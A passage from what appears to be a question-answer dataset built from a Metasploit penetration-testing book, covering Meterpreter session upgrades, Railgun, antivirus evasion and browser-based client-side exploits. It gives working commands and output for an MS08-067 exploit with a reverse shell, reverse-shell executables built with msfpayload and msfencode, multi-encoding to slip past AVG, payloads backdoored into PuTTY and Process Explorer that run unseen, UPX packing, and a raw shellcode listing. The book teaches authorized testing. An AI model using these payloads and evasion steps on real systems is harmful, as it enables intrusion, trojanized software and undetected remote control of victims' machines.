to\nupgrade a command shell payload to a Meterpreter payload once the system\nhas been exploited, by issuing the sessions -u command. This is useful if we\nuse a command shell payload as an initial stager and then find that this newly\nexploited system would make the perfect launching pad for further attacks\nMeterpreter 95\ninto the network. Let’s look at a quick example from start to finish using\nMS08-067 with a reverse command shell as the payload, and upgrade it to a\nMeterpreter shell.\nroot@bt:/opt/framework3/msf3# msfconsole\nmsf > search ms08_067\n[*] Searching loaded modules for pattern 'ms08_067'...\nExploits\n========\nName Rank Description\n---- ---- -----------\nwindows/smb/ms08_067_netapi great Microsoft Server Service Relative Path Stack\nCorruption\nmsf > use windows/smb/ms08_067_netapi\nmsf exploit(ms08_067_netapi) > set PAYLOAD windows/shell/reverse_tcp\npayload => windows/shell/reverse_tcp\nmsf exploit(ms08_067_netapi) > set TARGET 3\ntarget => 3\nmsf exploit(ms08_067_netapi) > setg LHOST 192.168.33.129 (cid:88)\nLHOST => 192.168.33.129\nmsf exploit(ms08_067_netapi) > setg LPORT 8080\nLPORT => 8080\nmsf exploit(ms08_067_netapi) > exploit -z (cid:89)\n[*] Started reverse handler on 192.168.33.129:8080\n[*] Triggering the vulnerability...\n[*] Sending stage (240 bytes)\n[*] Command shell session 1 opened (192.168.33.129:8080 -> 192.168.33.130:1032)\n[*] Session 1 created in the background.\nmsf exploit(ms08_067_netapi) > sessions -u 1 (cid:90)\n[*] Started reverse handler on 192.168.33.129:8080\n[*] Starting the payload handler...\n[*] Command Stager progress - 3.16% done (1694/53587 bytes)\n[*] Command Stager progress - 6.32% done (3388/53587 bytes)\n. . . SNIP . . .\n[*] Command Stager progress - 97.99% done (52510/53587 bytes)\n[*] Sending stage (748032 bytes)\nmsf exploit(ms08_067_netapi) > [*] Meterpreter session 2 opened (192.168.33.129:8080 ->\n192.168.33.130:1044)\nmsf exploit(ms08_067_netapi) > sessions -i 2\n[*] Starting interaction with 2...\nmeterpreter >\nAt (cid:88) we issue the setg command for LHOST and LPORT, which is required in\norder for the sessions -u 1 to upgrade to Meterpreter at (cid:90). (The setg command\nsets the LPORT and LHOST globally in Metasploit, not just for this exploit.)\n96 Chapter 6\nNotice at (cid:89) that when we exploit the system we issue the exploit -z\ncommand, which will not interact with the session once the target has been\nexploited. If you had already executed the exploit command at this point,\nyou could simply press CTRL-Z and run the session in the background.\nManipulating Windows APIs with the Railgun Add-On\nYou can interface with the Windows native API directly through a Metasploit\nadd-on called Railgun, which was written by Patrick HVE. By adding Railgun\nto the Metasploit Framework, you can natively call Windows APIs through\nMeterpreter, all through the Windows API. For example, in the following\nlisting, we’ll drop into an interactive Ruby shell (irb), available through\nMeterpreter. The irb shell allows us to interact directly with Meterpreter\nthrough Ruby-based syntax. We call Railgun in this example and create a\nsimple pop-up box saying “hello world”.\nmeterpreter > irb\n[*] Starting IRB shell\n[*] The 'client' variable holds the meterpreter client\n>> client.railgun.user32.MessageBoxA(0,\"hello\",\"world\",\"MB_OK\")\nOn our target Windows XP machine, you should see a pop-up box with\nworld in the title bar and hello in the message box. In this example, we simply\ncalled the user32.dll and the MessageBoxA function, which takes the parameters\nas shown.\nNOTE For a list of all documented API calls, visit http://msdn.microsoft.com/.\nWe won’t cover Railgun in detail (you can find a tutorial within the\nFramework directory under external/source/meterpreter/source/extensions/stdapi/\nserver/railgun/), but this gives you an idea of its power.\nThe implications are huge: Railgun gives you the same capabilities as a\nnative Win32 application with full access to the Windows API.\nWrapping Up\nHopefully, you’re now pretty comfortable with Meterpreter. We haven’t gone\nthrough every Meterpreter flag and option, because we expect your knowl-\nedge of Meterpreter to grow as you experiment and use it. Meterpreter is a\ncontinuously evolving tool with an enormous amount of support for scripts\nand additions. Once you become comfortable with the overall interface, you\nwill be able to master anything new. In Chapter 16, you will learn how to cre-\nate your own Meterpreter scripts from scratch and how the overall structure\nof a Meterpreter script is designed.\nMeterpreter 97"
  },
  {
    "input": "What are the key methods and techniques discussed for evading antivirus detection during a penetration test?",
    "summary": "This chapter discusses methods to evade antivirus detection during penetration tests, including creating custom payloads, encoding with tools like msfencode, and using packers. It also covers client-side attacks, such as browser-based exploits and file format vulnerabilities, which are often more effective than traditional network attacks. The text provides examples of how to use Metasploit to generate and test these payloads, emphasizing the importance of understanding how antivirus software works and using techniques like heap spraying and NOP slides to avoid detection.",
    "output": "A V O I D I N G D E T E C T I O N\nWhen you are performing a penetration test, nothing is\nmore embarrassing than being caught by antivirus soft-\nware. This is one of those little details that can be over-\nlooked quite easily: If you don’t make plans to evade\ndetection by antivirus software, watch out, because your\ntarget will quickly be alerted that something fishy is going on. Inthis chapter,\nwe’ll cover situations in which antivirus software might be anissue and discuss\npossible solutions.\nMost antivirus software uses signatures to identify aspects of malicious\ncode that are present in a sampling of malicious software. These signatures\nare loaded into antivirus engines and then used to scan disk storage and run-\nning processes for matches. When a match is found, the antivirus software\ntakes certain steps to respond to the situation: Most quarantine the binary\norkill the running process.\nAs you might imagine, this model has scaling issues. For one, the amount\nof malicious code in the wild means that an antivirus product loaded with\nsignatures can check files only so quickly for matching signatures. Also, the\nsignatures must be specific enough to trigger only when they encounter truly\nmalicious programs, not legitimate software. This model is relatively easy to\nimplement, yet it provides limited success in practice.\nThat being said, a lot of money is being made by antivirus publishers,\nand many smart and talented people work in the industry. If you plan to use\na payload that is not custom built, you can expect that antivirus software will\ndetect it.\nTo evade antivirus, we can create unique payloads to run on an antivirus\nsoftware–protected system that will not match any of the available signatures.\nIn addition, when we’re performing direct exploits on a system, Metasploit\npayloads are designed to run in memory and never to write data to the hard\ndisk. When we send a payload as part of an exploit, most antivirus programs\nwill not detect that it has been run on the target.\nRather than focus on specific commands in this chapter, we’ll focus on\nthe underlying concepts. Consider the sorts of characteristics that might trig-\nger antivirus software, and try to use the techniques presented here to change\nsections of code so that they no longer match the antivirus signatures. Don’t\nbe afraid to experiment.\nCreating Stand-Alone Binaries with MSFpayload\nBefore we perform an antivirus evasion, let’s look at how to create stand-\nalone Metasploit binary payloads with msfpayload. For starters, we’ll create a\nsimple reverse shell that connects back to the attacker and spawns a command\nshell. We’ll use msfpayload and windows/shell_reverse_tcp. But first, let’s look at\nthe available options for the shell_reverse_tcp payload using the O flag at (cid:88).\nroot@bt:/# msfpayload windows/shell_reverse_tcp O (cid:88)\n. . . SNIP . . .\nBasic options:\nName Current Setting Required Description\n---- --------------- -------- -----------\nEXITFUNC process yes Exit technique: seh, thread, process\nLHOST yes The local address\nLPORT 4444 yes The local port\nNow let’s run msfpayload again and provide the options needed to create\nthis payload in the Windows Portable Executable (PE) format. To do so, we\nprovide the X option as shown at (cid:88) as our output format:\nroot@bt:/# msfpayload windows/shell_reverse_tcp LHOST=192.168.1.101 LPORT=31337 X (cid:88) >\n/var/www/payload1.exe\nroot@bt:/# file /var/www/payload1.exe\nvar/www/payload1.exe: MS-DOS executable PE for MS Windows (GUI) Intel 80386 32-bit\nNow we have a working executable, so we can start a listener with the\nmulti/handler module in msfconsole. multi/handler allows Metasploit to listen\nfor reverse connections.\n100 Chapter 7\nmsf > use exploit/multi/handler (cid:88)\nmsf exploit(handler) > show options (cid:89)\n. . . SNIP . . .\nPayload options (windows/meterpreter/reverse_tcp):\nName Current Setting Required Description\n---- --------------- -------- -----------\nEXITFUNC process yes Exit technique: seh, thread, process\nLHOST 192.168.1.101 yes The local address\nLPORT 4444 yes The local port\n. . . SNIP . . .\nmsf exploit(handler) > set PAYLOAD windows/shell_reverse_tcp (cid:90)\nPAYLOAD => windows/shell_reverse_tcp\nmsf exploit(handler) > set LHOST 192.168.1.101 (cid:91)\nLHOST => 192.168.1.101\nmsf exploit(handler) > set LPORT 31337 (cid:92)\nLPORT => 31337\nmsf exploit(handler) >\nWe first use the multi/handler module at (cid:88) and get a quick display of the\noptions at (cid:89). Then, we set our payload to be a Windows reverse shell at (cid:90) so\nthat it matches the behavior of the executable we created earlier, tell it the IP\nat (cid:91) and the port to listen on at (cid:92), and we’re ready to go.\nEvading Antivirus Detection\nWe’ll use the popular AVG Anti-Virus product in the following examples.\nBecause it can take some time and multiple tries to circumvent certain antivirus\nengines, before we try to deploy a payload, we check the antivirus solution to\nmake sure the payload gets past it before we deploy it on the target.\nIn this case, when we test our payload with AVG, we see that it’s detected,\nas shown in Figure 7-1.\nFigure 7-1: AVG detected our payload.\nAvoiding Detection 101\nEncoding with MSFencode\nOne of the best ways to avoid being stopped by antivirus software is to encode\nour payload with msfencode. Msfencode is a useful tool that alters the code in an\nexecutable so that it looks different to antivirus software but will still run the\nsame way. Much as the binary attachment in email is encoded in Base64,\nmsfencode encodes the original executable in a new binary. Then, when the\nexecutable is run, msfencode decodes the original code into memory and exe-\ncutes it.\nYou can use msfencode -h to see a list of msfencode usage options. Of the\nmsfencode options, the encoder formats are among the most important. For a\nlist of encoder formats, we use msfencode -l, as shown next. Notice that differ-\nent encoders are used for different platforms, because, for example, aPower\nPC (PPC) encoder will not operate correctly on an x86 platform because of\ndifferences in the two architectures.\nroot@bt:/opt/framework3/msf3# msfencode -l\nFramework Encoders\n==================\nName Rank Description\n---- ---- -----------\ncmd/generic_sh good Generic Shell Variable Substitution Command Encoder\ncmd/ifs low Generic ${IFS} Substitution Command Encoder\ngeneric/none normal The \"none\" Encoder\nmipsbe/longxor normal XOR Encoder\nmipsle/longxor normal XOR Encoder\nphp/base64 normal PHP Base64 encoder\nppc/longxor normal PPC LongXOR Encoder\nppc/longxor_tag normal PPC LongXOR Encoder\nsparc/longxor_tag normal SPARC DWORD XOR Encoder\nx64/xor normal XOR Encoder\nx86/alpha_mixed low Alpha2 Alphanumeric Mixedcase Encoder\nx86/alpha_upper low Alpha2 Alphanumeric Uppercase Encoder\nx86/avoid_utf8_tolower manual Avoid UTF8/tolower\nx86/call4_dword_xor normal Call+4 Dword XOR Encoder\nx86/countdown normal Single-byte XOR Countdown Encoder\nx86/fnstenv_mov normal Variable-length Fnstenv/mov Dword XOR Encoder\nx86/jmp_call_additive normal Jump/Call XOR Additive Feedback Encoder\nx86/nonalpha low Non-Alpha Encoder\nx86/nonupper low Non-Upper Encoder\nx86/shikata_ga_nai excellent Polymorphic XOR Additive Feedback Encoder\nx86/single_static_bit manual Single Static Bit\nx86/unicode_mixed manual Alpha2 Alphanumeric Unicode Mixedcase Encoder\nx86/unicode_upper manual Alpha2 Alphanumeric Unicode Uppercase Encoder\n102 Chapter 7\nNow we’ll run a simple encoding of an MSF payload by importing raw\noutput from msfpayload into msfencode to see how the result affects our anti-\nvirus detection:\nroot@bt:/# msfpayload windows/shell_reverse_tcp LHOST=192.168.1.101 LPORT=31337 R (cid:88)|\nmsfencode -e x86/shikata_ga_nai (cid:89) -t exe (cid:90) > /var/www/payload2.exe\n[*] x86/shikata_ga_nai succeeded with size 342 (iteration=1)\nroot@bt:/# file /var/www/payload2.exe (cid:91)\n/var/www/2.exe: MS-DOS executable PE for MS Windows (GUI) Intel 80386 32-bit\nWe add the R flag at (cid:88) to the msfpayload command line to specify raw\noutput, because we will pipe its output directly into msfencode. We specify the\nx86/shikata_ga_nai encoder at (cid:89) and tell msfencode to send the executable out-\nput -t exe (cid:90) to /var/www/payload2.exe. Finally, we run a quick check at (cid:91) to\nensure that the resulting file is in fact a Windows executable. The response\ntells us that it is. Unfortunately, after the payload2.exe file is copied over to the\nWindows system, AVG detects our encoded payload yet again, as shown in\nFigure 7-2.\nFigure 7-2: AVG detected our encoded payload.\nMulti-encoding\nWhen we’re performing antivirus detection without modifying the static\nbinary itself, it’s always a cat-and-mouse game, because antivirus signatures\nare frequently updated to detect new and changed payloads. Within the\nFramework, we can get better results through multi-encoding, which allows\nthe payload to be encoded several times to throw off antivirus programs that\ncheck for signatures.\nIn the preceding example, the shikata_ga_nai encoding is polymorphic,\nmeaning that the payload will change each time the script is run. Of course,\nthe payload that an antivirus product will flag is a mystery: Every time you\ngenerate a payload, the same antivirus program can flag it once and miss it\nanother time.\nAvoiding Detection 103\nIt is recommended that you test your script using an evaluation version\nof a product to see if it bypasses the antivirus software prior to using it in a\npenetration test. Here’s an example of using multiple encoding passes:\nroot@bt:/opt/framework3/msf3# msfpayload windows/meterpreter/reverse_tcp\nLHOST=192.168.1.101 LPORT=31337 R | msfencode -e x86/shikata_ga_nai -c 5 (cid:88)\n-t raw (cid:89) | msfencode -e x86/alpha_upper -c 2 (cid:90) -t raw | msfencode -e\nx86/shikata_ga_nai -c 5 (cid:91) -t raw | msfencode -e x86/countdown -c 5 (cid:92)\n-t exe -o /var/www/payload3.exe\n[*] x86/shikata_ga_nai succeeded with size 318 (iteration=1)\n[*] x86/shikata_ga_nai succeeded with size 345 (iteration=2)\n[*] x86/shikata_ga_nai succeeded with size 372 (iteration=3)\n[*] x86/shikata_ga_nai succeeded with size 399 (iteration=4)\n[*] x86/shikata_ga_nai succeeded with size 426 (iteration=5)\n[*] x86/alpha_upper succeeded with size 921 (iteration=1)\n[*] x86/alpha_upper succeeded with size 1911 (iteration=2)\n[*] x86/shikata_ga_nai succeeded with size 1940 (iteration=1)\n[*] x86/shikata_ga_nai succeeded with size 1969 (iteration=2)\n[*] x86/shikata_ga_nai succeeded with size 1998 (iteration=3)\n[*] x86/shikata_ga_nai succeeded with size 2027 (iteration=4)\n[*] x86/shikata_ga_nai succeeded with size 2056 (iteration=5)\n[*] x86/countdown succeeded with size 2074 (iteration=1)\n[*] x86/countdown succeeded with size 2092 (iteration=2)\n[*] x86/countdown succeeded with size 2110 (iteration=3)\n[*] x86/countdown succeeded with size 2128 (iteration=4)\n[*] x86/countdown succeeded with size 2146 (iteration=5)\nroot@bt:/opt/framework3/msf3#\nHere we use five counts at (cid:88) of shikata_ga_nai, feeding the code in raw\nformat at (cid:89) into two counts of alpha_upper encoding at (cid:90), which is then fed\nto another five counts of shikata_ga_nai (cid:91),followed by five counts of countdown\nencoding at (cid:92), before finally directing the output into the desired execut-\nable. We are using a total of 17 encoding loops in an attempt to circumvent\nthe antivirus software. And, as you can see in Figure 7-3, we have successfully\nslipped our payload past the antivirus engine.\nFigure 7-3: AVG has not detected the multi-encoded payload.\n104 Chapter 7\nCustom Executable Templates\nTypically, when msfencode is run, the payload is embedded into the default\nexecutable template at data/templates/template.exe. Although this template is\nchanged on occasion, antivirus vendors still look for it when building signa-\ntures. However, msfencode now supports the use of any Windows executable\nin place of the default executable template via the -x option. In the follow-\ning example, we encode our payload again using the Process Explorer from\nMicrosoft’s Sysinternals Suite as a custom-executable template.\nroot@bt:/opt/framework3/msf3# wget http://download.sysinternals.com/Files/\nProcessExplorer.zip (cid:88)\n. . . SNIP . . .\n2011-03-21 17:14:46 (119 KB/s) - 'ProcessExplorer.zip' saved [1615732/1615732]\nroot@bt:/opt/framework3/msf3# cd work/\nroot@bt:/opt/framework3/msf3/work# unzip ../ProcessExplorer.zip (cid:89)\nArchive: ../ProcessExplorer.zip\ninflating: procexp.chm\ninflating: procexp.exe\ninflating: Eula.txt\nroot@bt:/opt/framework3/msf3/work# cd ..\nroot@bt:/opt/framework3/msf3# msfpayload windows/shell_reverse_tcp\nLHOST=192.168.1.101 LPORT=8080 R | msfencode -t exe -x work/procexp.exe (cid:90)\n-o /var/www/pe_backdoor.exe -e x86/shikata_ga_nai -c 5\n[*] x86/shikata_ga_nai succeeded with size 342 (iteration=1)\n[*] x86/shikata_ga_nai succeeded with size 369 (iteration=2)\n[*] x86/shikata_ga_nai succeeded with size 396 (iteration=3)\n[*] x86/shikata_ga_nai succeeded with size 423 (iteration=4)\n[*] x86/shikata_ga_nai succeeded with size 450 (iteration=5)\nAs you can see, at (cid:88) we download Process Explorer from Microsoft\nthenunzip it at (cid:89). Then at (cid:90) we use the -x switch to specify the downloaded\nProcess Explorer binary for use as our custom template. After encoding com-\npletes, we start up the multi-handler through msfcli to listen for the incoming\nconnection, as shown here:\nroot@bt:/opt/framework3/msf3# msfcli exploit/multi/handler PAYLOAD=windows/\nshell_reverse_tcp LHOST=192.168.1.101 LPORT=8080 E\n[*] Please wait while we load the module tree...\n[*] Started reverse handler on 192.168.1.101:8080\n[*] Starting the payload handler...\n[*] Command shell session 1 opened (192.168.1.101:8080 -> 192.168.1.195:1191)\nC:\\Documents and Settings\\Administrator\\My Documents\\Downloads>\nAnd voilà: We have successfully opened a shell without being detected by\nantivirus software.\nAvoiding Detection 105\nFigure 7-4: The backdoored executable is not detected by AVG.\nLaunching a Payload Stealthily\nFor the most part, when a targeted user launches a backdoored executable\nsuch as the one we just generated, nothing will appear to happen, and that\ncan raise suspicions. To improve your chances of not tipping off a target, you\ncan launch a payload while simultaneously continuing normal execution of\nthe launched application, as shown here:\nroot@bt:/opt/framework3/msf3# wget http://the.earth.li/~sgtatham/\nputty/latest/x86/putty.exe (cid:88)\n. . . SNIP . . .\n2011-03-21 17:02:48 (133 KB/s) – 'putty.exe' saved [454656/454656]\nroot@bt:/opt/framework3/msf3# msfpayload windows/shell_reverse_tcp\nLHOST=192.168.1.101 LPORT=8080 R | msfencode -t exe -x putty.exe -o /var/\nwww/putty_backdoor.exe -e x86/shikata_ga_nai -k (cid:89) -c 5\n[*] x86/shikata_ga_nai succeeded with size 342 (iteration=1)\n[*] x86/shikata_ga_nai succeeded with size 369 (iteration=2)\n[*] x86/shikata_ga_nai succeeded with size 396 (iteration=3)\n[*] x86/shikata_ga_nai succeeded with size 423 (iteration=4)\n[*] x86/shikata_ga_nai succeeded with size 450 (iteration=5)\nIn this listing, we download the PuTTY Windows SSH client at (cid:88) and\nthen access PuTTY using the -k flag at (cid:89). The -k flag configures the payload\nto launch in a separate thread from the main executable so the application\nwill behave normally while the payload is being executed. Now, as shown in\nFigure 7-5, when this executable is processed with AVG, it comes back clean\nand should execute while still presenting us with a shell! (This option may\nnot work with all executables, so be sure to test yours before deployment.)\nWhen choosing to embed a payload in an executable, you should con-\nsider using GUI-based applications if you’re not specifying the -k flag. If you\nembed a payload into a console-based application, when the payload is run,\nit will display a console window that won’t close until you’re finished using\nthe payload. If you choose a GUI-based application and do not specify the -k\n106 Chapter 7\nflag, when the payload is executed, the target will not see a console window.\nPaying attention to these little details can help you remain stealthy during an\nengagement.\nFigure 7-5: AVG declares the payload safe and the computer secure.\nPackers\nPackers are tools that compress an executable and combine it with decom-\npression code. When this new executable is run, the decompression code\nre-creates the original executable from the compressed code before execut-\ning it. This usually happens transparently so the compressed executable can\nbe used in exactly the same way as the original. The result of the packing pro-\ncess is a smaller executable that retains all the functionality of the original.\nAs with msfencode, packers change the structure of an executable. How-\never, unlike the msfencode encoding process, which often increases the size of\nan executable, a carefully chosen packer will use various algorithms to both\ncompress and encrypt an executable. Next, we use the popular UPX packer\nwith Back|Track to compress and encode our payload3.exe payload in attempt\nto evade antivirus software detection.\nroot@bt:/# apt-get install upx (cid:88)\n. . . SNIP . . .\nroot@bt:/# upx (cid:89)\nUltimate Packer for eXecutables\nCopyright (C) 1996 - 2009\nUPX 3.04 Markus Oberhumer, Laszlo Molnar & John Reiser Sep 27th 2009\nUsage: upx [-123456789dlthVL] [-qvfk] [-o file] file..\n. . . SNIP . . .\nType 'upx--help' for more detailed help.\nUPX comes with ABSOLUTELY NO WARRANTY; for details visit http://upx.sf.net\nAvoiding Detection 107\nroot@bt:/# upx -5 /var/www/payload3.exe (cid:90)\nUltimate Packer for eXecutables\nCopyright (C) 1996 - 2009\nUPX 3.04 Markus Oberhumer, Laszlo Molnar & John Reiser Sep 27th 2009\nFile size Ratio Format Name\n-------------------- ------ ----------- -----------\n37888 -> 22528 59.46% (cid:91) win32/pe payload3.exe\nPacked 1 file.\nAt (cid:88) we install UPX, and then at (cid:89) we run UPX with no arguments to\nview its command line options. Then at (cid:90) we use the -5 option to compress\nand pack our executable. You can see at (cid:91) that UPX compresses our payload\n59.46 percent.\nIn our tests, only 9 of 42 antivirus vendors detected the UPX-packed binaries.\nNOTE The PolyPack project (http://jon.oberheide.org/files/woot09-polypack.pdf)\nshows the results of packing known malicious binaries with various packers and the\neffectiveness of antivirus detection before and after the packing process.\nMSFVENOM\nIn this chapter we cover only the msfpayload and msfencode utilities, but there is an\nadditional tool called msfvenom that combines the functionalities of msfpayload and\nmsfencode in a simpler-to-use interface. Msfvenom is not covered in detail in this book\n(see Appendix B), but it should be very easy to use after you become familiar with\nmsfpayload and msfencode.\nA Final Note on Antivirus Software Evasion\nThe world of antivirus software moves very quickly, even by Internet stan-\ndards. As of this writing, the methods and processes documented in this\nchapter work successfully; however, experience has shown that even a few\nmonths can bring major changes in how antivirus evasion is accomplished.\nAlthough the Metasploit team is constantly tweaking its payloads and attempts\nto stay one step ahead of detection algorithms, don’t be surprised if by\nthetime you work through these examples, some work and some do not.\nWhen you’re attempting antivirus evasion, consider using multiple packers\nor encoders, as mentioned, or write your own. Antivirus evasion, like all pen-\netration testing skills, needs to be practiced and requires dedicated research\nto help you ensure success in your engagements.\n108 Chapter 7\nE X P L O I T A T I O N U S I N G\nC L I E N T - S I D E A T T A C K S\nYears of focus on defensive network perimeters have\ndrastically shrunk the traditional attack surfaces. When\none avenue of attack becomes too difficult to penetrate,\nattackers can find new and easier methods for attack-\ning their targets. Client-side attacks were the next evo-\nlution of attacks after network defenses became more\nprominent. These attacks target software commonly installed on computers\ninsuch programs as web browsers, PDF readers, and Microsoft Office appli-\ncations. Because these programs are commonly installed on computers out\nof the box, they are obvious attack vectors for hackers. It’s also common for\nthese applications to be out of date on users’ machines because of irregular\npatching cycles. Metasploit includes a number of built-in client-side exploits,\nwhich we’ll cover in depth in this chapter.\nIf you can bypass all the protective countermeasures a company has\ninplace and infiltrate a network by tricking a user into clicking a malicious\nlink, you have a much better chance of achieving a compromise. Suppose, for\nexample, that you are performing a covert penetration test against a corpo-\nrate target using social engineering. You decide that sending a phishing email\nto targeted users will present your best chance of success. You harvest email\naccounts, names, and phone numbers; browse social-networking sites; and\ncreate a list of known employees. Your malicious email instructs the email\nrecipients that payroll information needs to be updated; they need to click\nalink (a malicious link) in the email to do this. However, as soon as the user\nclicks the link, the machine is compromised, and you can access the organi-\nzation’s internal network.\nThis scenario is a common technique regularly leveraged in both pene-\ntration tests and actual malicious attacks. It is often easier to attack via users\nthan it is to exploit Internet-facing resources. Most organizations spend a sig-\nnificant amount of money protecting their Internet-facing systems with tools\nsuch as intrusion prevention systems (IPSs) and web application firewalls,\nwhile not investing nearly as much in educating their users about social-\nengineering attacks.\nIn March 2011, RSA, a well-known security company, was compromised\nby an attacker leveraging this same process. A malicious attacker sent an\nextremely targeted (spear-phishing) email that was crafted specifically for an\nAdobe Flash zero-day vulnerability. (Spear-phishing is an attack whereby users\nare heavily researched and targeted rather than randomly chosen from a\ncompany address book.) In RSA’s case, the email targeted a small group of\nusers and was able to compromise RSA’s internally connected systems and\nfurther penetrate its network.\nBrowser-Based Exploits\nWe’ll focus on browser-based exploits within Metasploit in this chapter.\nBrowser-based exploits are important techniques, because in many organiza-\ntions, users spend more time using their web browsers than using any other\napplications on their computers.\nConsider another scenario: We send an email to a small group at an\norganization with a link that each user will click. The users click the link, and\ntheir browsers open to our website, which has been specially crafted to exploit\na vulnerability in a certain version of Internet Explorer. The users’ browser\napplication is susceptible to this exploit and is now compromised simply by\nusers visiting our malicious website. On our end, access would be gained via a\npayload (Meterpreter, for example) running within the context of the user\nwho visited the site.\nNote one important element in this example: If the target user were run-\nning as an administrator, the attacker (we) would do the same. Client-side\nexploits traditionally run with the same permissions and rights as the target\nthey exploit. Often this is a regular user without administrative privileges,\nso we would need to perform a privilege-escalation attack to obtain additional\naccess, and an additional exploit would be necessary to elevate privileges. We\ncould also potentially attack other systems on the network in hopes of gain-\ning administrative-level access. In other cases, however, the current user’s\npermission levels are enough to achieve the infiltration. Consider your network\nsituation: Is your important data accessible via user accounts? Or is it accessible\nonly to the administrator account?\n110 Chapter 8\nHow Browser-Based Exploits Work\nBrowser exploits are similar to any traditional exploit but with one major dif-\nference: the method used for shellcode delivery. In a traditional exploit, the\nattacker’s entire goal is to gain remote code execution and deliver a malicious\npayload. In browser exploits, the most traditional way to gain remote code\nexecution is through an exploitation technique called heap spraying. But\nbefore examining heap spraying in detail, let’s talk about what the heap is\nand how it’s used.\nThe heap is memory that is unallocated and used by the application as\nneeded for the duration of the program’s runtime. The application will allo-\ncate whatever memory is necessary to complete whatever task is at hand. The\nheap is based on how much memory your computer has available and has used\nthrough the entire application’s life cycle. The location of memory allocated\nat runtime is not known in advance, so as attackers, we would not know where\nto place our shellcode. Hackers can’t simply call a memory address and\nhope to land at the payload—the randomness of memory allocated by the\nheap prevents this, and this randomness was a major challenge before heap\nspraying was discovered.\nBefore moving on, you also need to understand the concept of a no-\noperation instruction (NOP) and NOP slide. NOPs are covered in detail in\nChapter 15, but we’ll cover the basics here because they are important to\nunderstanding how heap spraying works. A NOP is an assembly instruction\nthat says, “Do nothing and move to the next instruction.” A NOP slide com-\nprises multiple NOPs adjacent to each other in memory, basically taking up\nspace. If a program’s execution flow encounters a series of NOP instructions,\nit will linearly “slide” down to the end of them to the next instruction. A\nNOP, in the Intel x86 architecture, has an opcode of 90, commonly seen in\nexploit code as \\x90.\nThe heap spraying technique involves filling the heap with a known\nrepeating pattern of NOP slides and your shellcode until you fill the entire\nmemory space with this known value. You’ll recall that memory in the heap is\ndynamically allocated at program runtime. This is usually done via JavaScript,\nwhich causes the browser’s allocated memory to grow significantly. The attacker\nfills large blocks of memory with NOP slides and shellcode directly after them.\nWhen program execution flow is altered and randomly jumps somewhere\ninto memory, there is a good chance of hitting a NOP slide and eventually\nhitting the shellcode. Instead of looking for a needle in a haystack—that is,\nthe shellcode in memory—heap spraying offers an 85 to 90 percent chance\nof the exploit being successful.\nThis technique changed the game in browser exploitation and in the\nreliability of exploiting browser bugs. We will not be covering the actual code\nbehind heap spraying, because it’s an advanced exploitation topic, but you\nshould know the basics so that you can understand how these browser-based\nexploits work. Before we begin launching our first browser exploit, let’s look\nat what actually happens behind the scenes when an exploit is launched.\nExploitation Using Client-Side Attacks 111\nLooking at NOPs\nNow that you understand the basics of a heap spray and a NOP, let’s take a\nlook at a generic NOP slide in an actual exploit. In the following listing, notice\nthe hexadecimal representation of \\x90, the Intel x86 architecture opcode.\nA 90 in Intel x86 assembly is a NOP. Here you see a series of \\x90s that create\nour NOP-slide effect. The rest of the code is the payload, such as a reverse\nshell or a Meterpreter shell.\n\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\n\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\n\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\n\\xfc\\xe8\\x89\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xd2\\x64\\x8b\\x52\\x30\n\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\\x4a\\x26\\x31\\xff\n\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\\x0d\\x01\\xc7\\xe2\n\\xf0\\x52\\x57\\x8b\\x52\\x10\\x8b\\x42\\x3c\\x01\\xd0\\x8b\\x40\\x78\\x85\n\\xc0\\x74\\x4a\\x01\\xd0\\x50\\x8b\\x48\\x18\\x8b\\x58\\x20\\x01\\xd3\\xe3\n\\x3c\\x49\\x8b\\x34\\x8b\\x01\\xd6\\x31\\xff\\x31\\xc0\\xac\\xc1\\xcf\\x0d\n\\x01\\xc7\\x38\\xe0\\x75\\xf4\\x03\\x7d\\xf8\\x3b\\x7d\\x24\\x75\\xe2\\x58\n\\x8b\\x58\\x24\\x01\\xd3\\x66\\x8b\\x0c\\x4b\\x8b\\x58\\x1c\\x01\\xd3\\x8b\n\\x04\\x8b\\x01\\xd0\\x89\\x44\\x24\\x24\\x5b\\x5b\\x61\\x59\\x5a\\x51\\xff\n\\xe0\\x58\\x5f\\x5a\\x8b\\x12\\xeb\\x86\\x5d\\x68\\x33\\x32\\x00\\x00\\x68\n\\x77\\x73\\x32\\x5f\\x54\\x68\\x4c\\x77\\x26\\x07\\xff\\xd5\\xb8\\x90\\x01\n\\x00\\x00\\x29\\xc4\\x54\\x50\\x68\\x29\\x80\\x6b\\x00\\xff\\xd5\\x50\\x50\n\\x50\\x50\\x40\\x50\\x40\\x50\\x68\\xea\\x0f\\xdf\\xe0\\xff\\xd5\\x97\\x31\n\\xdb\\x53\\x68\\x02\\x00\\x01\\xbb\\x89\\xe6\\x6a\\x10\\x56\\x57\\x68\\xc2\n\\xdb\\x37\\x67\\xff\\xd5\\x53\\x57\\x68\\xb7\\xe9\\x38\\xff\\xff\\xd5\\x53\n\\x53\\x57\\x68\\x74\\xec\\x3b\\xe1\\xff\\xd5\\x57\\x97\\x68\\x75\\x6e\\x4d\n\\x61\\xff\\xd5\\x6a\\x00\\x6a\\x04\\x56\\x57\\x68\\x02\\xd9\\xc8\\x5f\\xff\n\\xd5\\x8b\\x36\\x6a\\x40\\x68\\x00\\x10\\x00\\x00\\x56\\x6a\\x00\\x68\\x58\n\\xa4\\x53\\xe5\\xff\\xd5\\x93\\x53\\x6a\\x00\\x56\\x53\\x57\\x68\\x02\\xd9\n\\xc8\\x5f\\xff\\xd5\\x01\\xc3\\x29\\xc6\\x85\\xf6\\x75\\xec\\xc3\nUsing Immunity Debugger to Decipher NOP Shellcode\nDebuggers offer a window into the running state of a program, including\nassembly instruction flow, memory contents, and exception details. Penetra-\ntion testers leverage debuggers on a regular basis to identify zero-day vulner-\nabilities and to understand how an application works and how to attack it. A\nnumber of debuggers are out there, but our personal preference going forward\n(and used in later chapters) is Immunity Debugger. We recommend that you\ntake a look at the basics of Immunity Debugger before proceeding.\nTo understand what a NOP slide does, let’s use a debugger to look at how\nthe NOP 